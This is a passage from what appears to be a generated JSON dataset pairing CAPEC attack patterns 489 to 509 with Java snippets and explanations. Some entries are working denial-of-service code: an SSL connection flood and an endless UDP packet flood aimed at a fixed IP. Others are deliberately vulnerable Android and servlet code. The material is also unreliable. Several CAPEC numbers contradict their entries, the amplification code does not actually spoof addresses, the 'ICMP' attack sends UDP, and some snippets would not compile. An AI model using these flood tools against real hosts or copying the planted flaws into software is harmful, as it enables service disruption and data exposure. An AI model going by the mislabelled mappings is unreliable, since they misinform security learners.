        "description": "This Java servlet code represents a vulnerable endpoint that can be exploited for an HTTP Flood attack. The servlet processes HTTP GET requests and includes sensitive information in the query string (CWE-598). It performs a resource-intensive operation without any rate limiting or resource allocation checks (CWE-770), making it susceptible to denial-of-service attacks by consuming server resources. The lack of throttling allows an attacker to flood the server with legitimate HTTP GET requests, leading to resource exhaustion and denial of service for legitimate users."
    },
    {
        "capec_id": "489",
        "capec_name": "SSL Flood",
        "code_snippet": "import javax.net.ssl.SSLSocketFactory;\nimport javax.net.ssl.SSLSocket;\nimport java.io.IOException;\nimport java.net.Socket;\n\npublic class SSLFloodAttack {\n    public static void main(String[] args) {\n        String host = \"example.com\";\n        int port = 443;\n        int numberOfConnections = 1000; // Number of connections to simulate the attack\n\n        for (int i = 0; i < numberOfConnections; i++) {\n            new Thread(() -> {\n                try {\n                    SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();\n                    SSLSocket socket = (SSLSocket) factory.createSocket(host, port);\n                    socket.startHandshake();\n                    // Keep the connection open to consume server resources\n                    Thread.sleep(10000);\n                    socket.close();\n                } catch (IOException | InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }).start();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an SSL Flood attack. The code creates multiple threads, each establishing an SSL connection to a specified server (example.com on port 443). The connections are kept open for a period of time to consume server resources. This simulates the attack described in the CAPEC, where an attacker uses SSL connections to exhaust server resources, leading to a denial of service for legitimate users. The code embodies CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-400 (Uncontrolled Resource Consumption) by not limiting the number of connections and keeping them open, thereby consuming server resources excessively."
    },
    {
        "capec_id": "490",
        "capec_name": "Amplification",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class AmplificationAttack {\n    public static void main(String[] args) throws Exception {\n        if (args.length != 3) {\n            System.out.println(\"Usage: java AmplificationAttack <target_ip> <amplifier_ip> <message>\");\n            return;\n        }\n\n        String targetIp = args[0];\n        String amplifierIp = args[1];\n        String message = args[2];\n\n        DatagramSocket socket = new DatagramSocket();\n        byte[] buffer = message.getBytes();\n\n        InetAddress amplifierAddress = InetAddress.getByName(amplifierIp);\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, amplifierAddress, 7); // Port 7 is echo service\n\n        // Spoof the source IP address to be the target IP\n        socket.connect(InetAddress.getByName(targetIp), 7);\n\n        // Send the packet to the amplifier\n        socket.send(packet);\n\n        System.out.println(\"Packet sent to amplifier with spoofed source IP.\");\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a basic amplification attack. The program sends a small request to an amplifier server (e.g., an echo service) with the source IP address spoofed to be that of the target server. The amplifier server then sends a larger response to the target server, causing an amplification effect. This code embodies the main idea of CAPEC-130 (Amplification) and highlights related CWEs such as CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-405 (Asymmetric Resource Consumption), and CWE-406 (Insufficient Control of Network Message Volume). The code does not include any resource limits or throttling, making it vulnerable to abuse."
    },
    {
        "capec_id": "491",
        "capec_name": "Quadratic Data Expansion",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class QuadraticDataExpansion {\n    public static void main(String[] args) {\n        // Define a large entity\n        String largeEntity = \"A very large entity\";\n        \n        // Create a map to store expanded data\n        Map<String, String> expandedData = new HashMap<>();\n        \n        // Perform multiple substitutions\n        for (int i = 0; i < 10000; i++) {\n            expandedData.put(\"key\" + i, largeEntity);\n        }\n        \n        // Simulate processing the expanded data\n        processExpandedData(expandedData);\n    }\n    \n    private static void processExpandedData(Map<String, String> data) {\n        // Simulate processing each entry\n        for (Map.Entry<String, String> entry : data.entrySet()) {\n            System.out.println(\"Processing: \" + entry.getKey() + \" -> \" + entry.getValue());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Quadratic Data Expansion vulnerability. The code defines a large entity and then performs multiple substitutions by adding the large entity to a map multiple times. This can lead to excessive memory allocation, potentially causing a denial of service. The `processExpandedData` method simulates processing the expanded data, which can further exacerbate the memory consumption. This example embodies the main idea of CAPEC-197 and related CWEs, such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-1325 (Improperly Controlled Sequential Memory Allocation)."
    },
    {
        "capec_id": "492",
        "capec_name": "Regular Expression Exponential Blowup",
        "code_snippet": "import java.util.regex.Pattern;\nimport java.util.regex.Matcher;\n\npublic class RegexExponentialBlowup {\n    public static void main(String[] args) {\n        String regex = \"(a+)+\"; // Inefficient regex with exponential complexity\n        String input = \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!\"; // Input designed to cause exponential blowup\n\n        Pattern pattern = Pattern.compile(regex);\n        Matcher matcher = pattern.matcher(input);\n\n        long startTime = System.currentTimeMillis();\n        boolean matchFound = matcher.matches();\n        long endTime = System.currentTimeMillis();\n\n        System.out.println(\"Match found: \" + matchFound);\n        System.out.println(\"Time taken: \" + (endTime - startTime) + \"ms\");\n    }\n}",
        "description": "This Java code snippet demonstrates a Regular Expression Exponential Blowup vulnerability. The regular expression '(a+)+' is inefficient and has exponential worst-case complexity. When matched against the input string 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!', it causes excessive CPU consumption due to backtracking. This example highlights CWE-400 (Uncontrolled Resource Consumption) and CWE-1333 (Inefficient Regular Expression Complexity). The code measures the time taken to perform the match, illustrating the potential performance impact of such a vulnerability."
    },
    {
        "capec_id": "493",
        "capec_name": "SOAP Array Blowup",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.parsers.ParserConfigurationException;\nimport org.xml.sax.InputSource;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\n\npublic class SOAPArrayBlowup {\n    public static void main(String[] args) {\n        String soapMessage = \"<soap:Envelope xmlns:soap=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\"><soap:Body><ArrayOfStrings xmlns=\\\"http://tempuri.org/\\\"><string>1</string><string>2</string></ArrayOfStrings></soap:Body></soap:Envelope>\";\n        for (int i = 0; i < 1000000; i++) {\n            soapMessage = soapMessage.replace(\"</ArrayOfStrings>\", \"<string>\" + i + \"</string></ArrayOfStrings>\");\n        }\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document document = builder.parse(new InputSource(new StringReader(soapMessage)));\n            System.out.println(\"Parsed SOAP message successfully\");\n        } catch (ParserConfigurationException | SAXException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a SOAP Array Blowup attack. The code constructs a SOAP message with a large array declaration by repeatedly adding elements to the array. The SOAP message is then parsed using an XML parser. This can lead to memory exhaustion as the parser attempts to allocate space for the large number of array elements. The code highlights the vulnerability described in CAPEC-220 and related CWEs, such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-1325 (Improperly Controlled Sequential Memory Allocation). The lack of limits on the size of the SOAP array can cause the web service to run out of memory, leading to a denial of service."
    },
    {
        "capec_id": "494",
        "capec_name": "TCP Fragmentation",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.InputStream;\nimport java.util.Arrays;\n\npublic class TCPFragmentationAttack {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server is listening on port 8080\");\n\n        while (true) {\n            Socket socket = serverSocket.accept();\n            new Thread(new ClientHandler(socket)).start();\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket socket;\n\n    public ClientHandler(Socket socket) {\n        this.socket = socket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            InputStream input = socket.getInputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n\n            while ((bytesRead = input.read(buffer)) != -1) {\n                byte[] fragment = Arrays.copyOfRange(buffer, 0, bytesRead);\n                // Simulate processing of fragmented TCP packet\n                processFragment(fragment);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void processFragment(byte[] fragment) {\n        // Simulate improper handling of fragmented packets\n        // This is where the attack can exploit the system\n        System.out.println(\"Processing fragment: \" + Arrays.toString(fragment));\n    }\n}",
        "description": "This Java code snippet demonstrates a basic server that listens for incoming TCP connections on port 8080. When a client connects, it spawns a new thread to handle the connection. The ClientHandler class reads data from the socket in fragments and processes each fragment. The processFragment method simulates the improper handling of fragmented TCP packets, which can be exploited by an attacker to bypass network filtering rules. This code embodies the main idea of the CAPEC 'TCP Fragmentation' attack by showing how fragmented packets can be processed in a way that may lead to security vulnerabilities. The related CWEs provide additional context, such as the lack of resource limits (CWE-770), improper resource release (CWE-404), and potential for inconsistent interpretation of requests (CWE-444)."
    },
    {
        "capec_id": "495",
        "capec_name": "UDP Fragmentation",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.util.Arrays;\n\npublic class UDPFragmentationAttack {\n    public static void main(String[] args) throws Exception {\n        InetAddress targetAddress = InetAddress.getByName(\"192.168.1.1\");\n        int targetPort = 12345;\n        byte[] largeData = new byte[2000]; // Data larger than typical MTU\n        Arrays.fill(largeData, (byte) 0xAB); // Fill with dummy data\n\n        DatagramSocket socket = new DatagramSocket();\n        DatagramPacket packet = new DatagramPacket(largeData, largeData.length, targetAddress, targetPort);\n\n        // Send the large packet, causing fragmentation\n        socket.send(packet);\n        System.out.println(\"Packet sent, causing fragmentation.\");\n\n        // No resource limits or throttling\n        while (true) {\n            socket.send(packet);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a UDP fragmentation attack. The code sends a large UDP packet (2000 bytes) to a target server, which exceeds the typical MTU (1500 bytes) and forces IP fragmentation. The while loop continuously sends these large packets, consuming network bandwidth and potentially overwhelming the target server's CPU and memory resources. This example embodies the CAPEC description by illustrating how an attacker can exploit the lack of resource limits (CWE-770) and insufficient control of network message volume (CWE-406) to perform a denial-of-service attack. The code does not handle resource shutdown or release (CWE-404), which can exacerbate the attack's impact."
    },
    {
        "capec_id": "496",
        "capec_name": "ICMP Fragmentation",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class ICMPFragmentationAttack {\n    public static void main(String[] args) throws Exception {\n        InetAddress targetAddress = InetAddress.getByName(\"192.168.1.1\");\n        byte[] data = new byte[65507]; // Maximum size for UDP packet\n        DatagramSocket socket = new DatagramSocket();\n\n        // CWE-770: No limit on the number of packets sent\n        for (int i = 0; i < Integer.MAX_VALUE; i++) {\n            DatagramPacket packet = new DatagramPacket(data, data.length, targetAddress, 7);\n            socket.send(packet);\n        }\n\n        // CWE-404: Improper resource release\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates an ICMP Fragmentation attack by sending a large number of oversized UDP packets to a target host. The code does not impose any limits on the number of packets sent (CWE-770), which can lead to resource exhaustion on the target. Additionally, the socket is closed improperly (CWE-404), which can cause resource leaks. The main idea is to overwhelm the target with fragmented packets, potentially causing it to become non-responsive."
    },
    {
        "capec_id": "497",
        "capec_name": "File Discovery",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class FileDiscovery {\n    public static void main(String[] args) {\n        if (args.length < 1) {\n            System.out.println(\"Usage: java FileDiscovery <directory>\");\n            return;\n        }\n\n        String directory = args[0];\n        File dir = new File(directory);\n\n        if (!dir.exists() || !dir.isDirectory()) {\n            System.out.println(\"Invalid directory\");\n            return;\n        }\n\n        File[] files = dir.listFiles();\n        if (files != null) {\n            for (File file : files) {\n                if (file.isFile()) {\n                    System.out.println(\"Found file: \" + file.getName());\n                    try {\n                        String content = new String(Files.readAllBytes(Paths.get(file.getPath())));\n                        System.out.println(\"Content: \" + content);\n                    } catch (IOException e) {\n                        System.out.println(\"Error reading file: \" + file.getName());\n                    }\n                }\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic file discovery mechanism. The program takes a directory path as an argument, lists all files in the directory, and reads their contents. This embodies the CAPEC 'File Discovery' by probing and exploring files in a given directory. The code is vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it reads and prints file contents without any access control. It also relates to CWE-529 (Exposure of Access Control List Files to an Unauthorized Control Sphere) by potentially exposing sensitive files stored in the directory. Additionally, CWE-73 (External Control of File Name or Path) is relevant as the directory path is controlled by user input, which could lead to unintended file access."
    },
    {
        "capec_id": "498",
        "capec_name": "Probe iOS Screenshots",
        "code_snippet": "import java.awt.image.BufferedImage;\nimport java.io.File;\nimport javax.imageio.ImageIO;\n\npublic class ScreenshotHandler {\n    public static void main(String[] args) {\n        try {\n            // Simulate taking a screenshot\n            BufferedImage screenshot = new BufferedImage(200, 200, BufferedImage.TYPE_INT_ARGB);\n            // Save the screenshot to a file\n            File outputfile = new File(\"screenshot.png\");\n            ImageIO.write(screenshot, \"png\", outputfile);\n            \n            // Simulate sensitive information exposure\n            String sensitiveInfo = \"User's private data\";\n            System.out.println(\"Sensitive Info: \" + sensitiveInfo);\n            \n            // Clear sensitive information before app goes to background\n            sensitiveInfo = null;\n            System.out.println(\"Sensitive Info after clearing: \" + sensitiveInfo);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet simulates the process of taking a screenshot and saving it to a file, which represents the CAPEC 'Probe iOS Screenshots'. The code also demonstrates the exposure of sensitive information (CWE-359) by printing it to the console. To mitigate this, the sensitive information is cleared before the application goes to the background. This snippet highlights the importance of managing sensitive data properly to prevent unauthorized access, especially in scenarios where temporary screenshots might be created by the OS."
    },
    {
        "capec_id": "499",
        "capec_name": "Android Intent Intercept",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.content.IntentFilter;\nimport android.util.Log;\n\npublic class VulnerableReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // CWE-927: Use of Implicit Intent for Sensitive Communication\n        String sensitiveData = intent.getStringExtra(\"sensitiveData\");\n        Log.d(\"VulnerableReceiver\", \"Received sensitive data: \" + sensitiveData);\n    }\n\n    public static void registerReceiver(Context context) {\n        IntentFilter filter = new IntentFilter();\n        filter.addAction(\"com.example.SENSITIVE_ACTION\");\n        // CWE-926: Improper Export of Android Application Components\n        context.registerReceiver(new VulnerableReceiver(), filter);\n    }\n\n    public static void sendSensitiveData(Context context, String data) {\n        Intent intent = new Intent();\n        intent.setAction(\"com.example.SENSITIVE_ACTION\");\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        intent.putExtra(\"sensitiveData\", data);\n        context.sendBroadcast(intent);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Android BroadcastReceiver that can be exploited as described in the CAPEC 'Android Intent Intercept'. The `VulnerableReceiver` class receives an implicit intent containing sensitive data without verifying the source of the intent (CWE-925). The `sendSensitiveData` method sends sensitive data using an implicit intent (CWE-927) and transmits it in cleartext (CWE-319). The `registerReceiver` method registers the receiver without proper restrictions, making it accessible to any application (CWE-926). This setup allows a malicious application to intercept, modify, or block the intent, leading to potential information disclosure or data injection."
    },
    {
        "capec_id": "500",
        "capec_name": "WebView Injection",
        "code_snippet": "import android.app.Activity;\nimport android.os.Bundle;\nimport android.webkit.WebView;\nimport android.webkit.WebViewClient;\nimport android.webkit.JavascriptInterface;\n\npublic class MainActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        WebView webView = findViewById(R.id.webview);\n        webView.getSettings().setJavaScriptEnabled(true);\n        webView.setWebViewClient(new WebViewClient());\n\n        // Adding a JavaScript interface that can be exploited\n        webView.addJavascriptInterface(new WebAppInterface(), \"Android\");\n\n        // Loading a potentially malicious URL\n        webView.loadUrl(\"http://example.com\");\n    }\n\n    public class WebAppInterface {\n        @JavascriptInterface\n        public void showToast(String toast) {\n            // Dangerous method that can be exploited\n            Toast.makeText(MainActivity.this, toast, Toast.LENGTH_SHORT).show();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Android application that uses a WebView component to load a web page. The WebView is configured to enable JavaScript and includes a JavaScript interface (`WebAppInterface`) that exposes a method (`showToast`) to JavaScript running in the WebView. This method can be exploited by a malicious web page to execute arbitrary code within the context of the application. The code snippet embodies the main idea of the CAPEC 'WebView Injection' by showing how an adversary can inject code into the WebView and manipulate the application. The related CWEs are represented by the dangerous method exposed through the JavaScript interface (CWE-749), the lack of proper verification of the source of the communication channel (CWE-940), and the potential for embedded malicious code (CWE-506)."
    },
    {
        "capec_id": "501",
        "capec_name": "Android Activity Hijack",
        "code_snippet": "import android.app.Activity;\nimport android.content.Intent;\nimport android.os.Bundle;\nimport android.util.Log;\n\npublic class MainActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        // Implicit Intent to launch a trusted activity\n        Intent intent = new Intent(\"com.example.TRUSTED_ACTIVITY\");\n        startActivity(intent);\n    }\n}\n\n// MaliciousActivity.java\nimport android.app.Activity;\nimport android.os.Bundle;\nimport android.util.Log;\n\npublic class MaliciousActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_malicious);\n\n        // Mimic the trusted activity's UI\n        Log.d(\"MaliciousActivity\", \"Mimicking trusted activity UI\");\n    }\n\n    // Method to capture sensitive data\n    private void captureSensitiveData() {\n        // Code to capture sensitive data\n        Log.d(\"MaliciousActivity\", \"Capturing sensitive data\");\n    }\n}",
        "description": "The provided code snippet demonstrates a scenario where an implicit intent is used to launch a trusted activity in an Android application. The MainActivity class sends an implicit intent to start an activity identified by the action 'com.example.TRUSTED_ACTIVITY'. However, this implicit intent can be intercepted by a malicious activity, represented by the MaliciousActivity class. The malicious activity mimics the user interface of the trusted activity and captures sensitive data from the user. This code embodies the main idea of the CAPEC 'Android Activity Hijack' and highlights the related CWEs, such as the use of implicit intents (CWE-927) and improper verification of the communication channel (CWE-940)."
    },
    {
        "capec_id": "502",
        "capec_name": "Intent Spoof",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.util.Log;\n\npublic class VulnerableReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // CWE-925: Improper Verification of Intent by Broadcast Receiver\n        String action = intent.getAction();\n        if (action != null && action.equals(\"com.example.TRUSTED_ACTION\")) {\n            // CWE-284: Improper Access Control\n            String sensitiveData = intent.getStringExtra(\"sensitiveData\");\n            Log.d(\"VulnerableReceiver\", \"Received sensitive data: \" + sensitiveData);\n        }\n    }\n}\n\n// AndroidManifest.xml\n// CWE-926: Improper Export of Android Application Components\n<receiver android:name=\".VulnerableReceiver\"\n          android:exported=\"true\">\n    <intent-filter>\n        <action android:name=\"com.example.TRUSTED_ACTION\" />\n    </intent-filter>\n</receiver>",
        "description": "This Java code snippet demonstrates a vulnerable Android BroadcastReceiver that embodies the main idea of the CAPEC 'Intent Spoof'. The BroadcastReceiver listens for intents with the action 'com.example.TRUSTED_ACTION'. However, it does not verify the source of the intent (CWE-925), which can lead to improper access control (CWE-284). Additionally, the receiver is exported in the AndroidManifest.xml without proper restrictions (CWE-926), making it accessible to any application. This setup allows a malicious application to send an intent to the VulnerableReceiver, potentially leading to data modification, information disclosure, or data injection."
    },
    {
        "capec_id": "503",
        "capec_name": "WebView Exposure",
        "code_snippet": "import android.app.Activity;\nimport android.os.Bundle;\nimport android.webkit.WebView;\nimport android.webkit.WebViewClient;\nimport android.webkit.JavascriptInterface;\n\npublic class MainActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        WebView myWebView = findViewById(R.id.webview);\n        myWebView.getSettings().setJavaScriptEnabled(true);\n        myWebView.setWebViewClient(new WebViewClient());\n        myWebView.addJavascriptInterface(new WebAppInterface(this), \"AndroidInterface\");\n        myWebView.loadUrl(\"http://example.com\");\n    }\n\n    public class WebAppInterface {\n        Activity mActivity;\n\n        WebAppInterface(Activity activity) {\n            mActivity = activity;\n        }\n\n        @JavascriptInterface\n        public void showToast(String toast) {\n            Toast.makeText(mActivity, toast, Toast.LENGTH_SHORT).show();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of a WebView in an Android application. The WebView is configured to enable JavaScript and an interface is registered using the addJavascriptInterface API. The interface, 'AndroidInterface', exposes a method 'showToast' that can be called from any web page loaded in the WebView. This setup can be exploited by a malicious web page to access application-specific functionality, representing the 'WebView Exposure' CAPEC. The related CWEs are illustrated by the improper access control (CWE-284) and the exposed dangerous method (CWE-749), as the interface method is not properly restricted and can be invoked by any loaded web page."
    },
    {
        "capec_id": "504",
        "capec_name": "Task Impersonation",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\npublic class TaskImpersonationServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        HttpSession session = request.getSession();\n        String task = request.getParameter(\"task\");\n        String userRole = (String) session.getAttribute(\"userRole\");\n\n        if (\"adminTask\".equals(task) && !\"admin\".equals(userRole)) {\n            // CWE-285: Improper Authorization\n            response.sendError(HttpServletResponse.SC_FORBIDDEN, \"You are not authorized to perform this task.\");\n            return;\n        }\n\n        // Simulate task execution\n        executeTask(task);\n    }\n\n    private void executeTask(String task) {\n        // CWE-506: Embedded Malicious Code\n        if (\"maliciousTask\".equals(task)) {\n            // Malicious code execution\n            System.out.println(\"Executing malicious task...\");\n        } else {\n            System.out.println(\"Executing legitimate task: \" + task);\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a scenario where an adversary could impersonate a task to gain unauthorized access or execute malicious code. The `doPost` method handles a task request and checks the user's role stored in the session. If a non-admin user attempts to perform an admin task, the servlet returns a forbidden error (CWE-285: Improper Authorization). The `executeTask` method simulates task execution, including a check for a malicious task (CWE-506: Embedded Malicious Code), which represents the potential for executing harmful actions. This code embodies the CAPEC idea of task impersonation by showing how an adversary could exploit improper authorization and embedded malicious code to perform unauthorized actions or execute malicious tasks."
    },
    {
        "capec_id": "505",
        "capec_name": "Scheme Squatting",
        "code_snippet": "import java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class MaliciousApp {\n    private static final Map<String, String> registeredSchemes = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Register a URL scheme intended for a target application\n        registerScheme(\"targetapp\", \"http://malicious.com\");\n\n        // Simulate receiving a URL intended for the target application\n        handleIncomingURL(\"targetapp://login?username=user&password=pass\");\n    }\n\n    public static void registerScheme(String scheme, String handler) {\n        registeredSchemes.put(scheme, handler);\n    }\n\n    public static void handleIncomingURL(String url) {\n        try {\n            URI uri = new URI(url);\n            String scheme = uri.getScheme();\n            if (registeredSchemes.containsKey(scheme)) {\n                // Redirect to malicious handler\n                String handler = registeredSchemes.get(scheme);\n                System.out.println(\"Redirecting to: \" + handler);\n\n                // Mimic the target application login screen\n                mimicLoginScreen(uri.getQuery());\n            } else {\n                System.out.println(\"No handler registered for scheme: \" + scheme);\n            }\n        } catch (URISyntaxException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void mimicLoginScreen(String query) {\n        // Extract sensitive information from the query string\n        String[] params = query.split(\"&\");\n        for (String param : params) {\n            String[] keyValue = param.split(\"=\");\n            System.out.println(\"Mimicking input for: \" + keyValue[0] + \" with value: \" + keyValue[1]);\n        }\n        // Here, the malicious app would display a fake login screen to capture credentials\n    }\n}",
        "description": "This Java code snippet demonstrates a 'Scheme Squatting' attack. The malicious application registers a URL scheme ('targetapp') intended for a target application that is not installed. When a URL with this scheme is received, the malicious application redirects to a handler and mimics the target application's login screen to capture sensitive information. The code also highlights related weaknesses such as improper authorization in the handler for the custom URL scheme (CWE-939) and the use of GET request method with sensitive query strings (CWE-598)."
    },
    {
        "capec_id": "506",
        "capec_name": "Tapjacking",
        "code_snippet": "import android.app.Activity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.FrameLayout;\nimport android.widget.LinearLayout;\nimport android.widget.TextView;\n\npublic class TapjackingActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        // Create a malicious overlay\n        FrameLayout overlay = new FrameLayout(this);\n        overlay.setLayoutParams(new FrameLayout.LayoutParams(\n                FrameLayout.LayoutParams.MATCH_PARENT,\n                FrameLayout.LayoutParams.MATCH_PARENT));\n        overlay.setBackgroundColor(0x80000000); // Semi-transparent overlay\n\n        // Add a button that appears to be part of the underlying app\n        Button hiddenButton = new Button(this);\n        hiddenButton.setText(\"Click Me\");\n        hiddenButton.setLayoutParams(new FrameLayout.LayoutParams(\n                FrameLayout.LayoutParams.WRAP_CONTENT,\n                FrameLayout.LayoutParams.WRAP_CONTENT));\n        overlay.addView(hiddenButton);\n\n        // Add the overlay to the main layout\n        LinearLayout mainLayout = findViewById(R.id.main_layout);\n        mainLayout.addView(overlay);\n\n        // Set an OnClickListener to the hidden button\n        hiddenButton.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                // Malicious action\n                TextView textView = findViewById(R.id.text_view);\n                textView.setText(\"You have been tapjacked!\");\n            }\n        });\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of a tapjacking attack in an Android application. The code creates a semi-transparent overlay with a button that appears to be part of the underlying application. When the user taps the button, a malicious action is performed, such as changing the text of a TextView to indicate that the user has been tapjacked. This example embodies the main idea of CAPEC-1021 (Tapjacking) by misleading the user into interacting with an interface that is not part of the intended application. The code also touches on CWE-451 (User Interface Misrepresentation of Critical Information) by obscuring the true nature of the interface the user is interacting with."
    },
    {
        "capec_id": "507",
        "capec_name": "Physical Theft",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class SensitiveDataStorage {\n    public static void main(String[] args) {\n        String sensitiveData = \"This is very sensitive information.\";\n        File file = new File(\"/tmp/sensitive_data.txt\");\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(sensitiveData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the improper storage of sensitive information, which is vulnerable to physical theft. The code writes sensitive data to a file in the /tmp directory without any access control mechanisms. This embodies the CAPEC of 'Physical Theft' by illustrating how an adversary with physical access to the system can easily retrieve sensitive information. The code is vulnerable to CWE-922 (Insecure Storage of Sensitive Information) and CWE-921 (Storage of Sensitive Data in a Mechanism without Access Control), as it does not implement any security measures to protect the sensitive data from unauthorized access."
    },
    {
        "capec_id": "508",
        "capec_name": "Shoulder Surfing",
        "code_snippet": "import java.util.Scanner;\n\npublic class ShoulderSurfingExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your password: \");\n        String password = scanner.nextLine();\n        System.out.println(\"Password entered: \" + password);\n    }\n}",
        "description": "This Java code snippet demonstrates a simple console application where a user is prompted to enter a password. The password is then displayed back to the user. This example embodies the concept of a shoulder surfing attack (CAPEC-200) by exposing sensitive information (the password) in a way that can be easily observed by an unauthorized actor. The code also touches on related CWEs: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor), as the password is displayed in cleartext, making it vulnerable to being seen by someone looking over the user's shoulder."
    },
    {
        "capec_id": "509",
        "capec_name": "Kerberoasting",
        "code_snippet": "import java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Base64;\n\npublic class KerberoastingExample {\n    public static void main(String[] args) {\n        String serviceTicket = getServiceTicket(\"serviceAccount\");\n        saveTicketToFile(serviceTicket, \"ticket.txt\");\n        String hashedTicket = hashTicket(serviceTicket);\n        System.out.println(\"Hashed Ticket: \" + hashedTicket);\n    }\n\n    private static String getServiceTicket(String account) {\n        // Simulate obtaining a service ticket for a given account\n        return \"fakeServiceTicketFor\" + account;\n    }\n\n    private static void saveTicketToFile(String ticket, String filename) {\n        try (FileOutputStream fos = new FileOutputStream(filename)) {\n            fos.write(ticket.getBytes());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static String hashTicket(String ticket) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"MD5\"); // Weak hashing algorithm\n            byte[] hash = md.digest(ticket.getBytes());\n            return Base64.getEncoder().encodeToString(hash);\n        } catch (NoSuchAlgorithmException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n}",
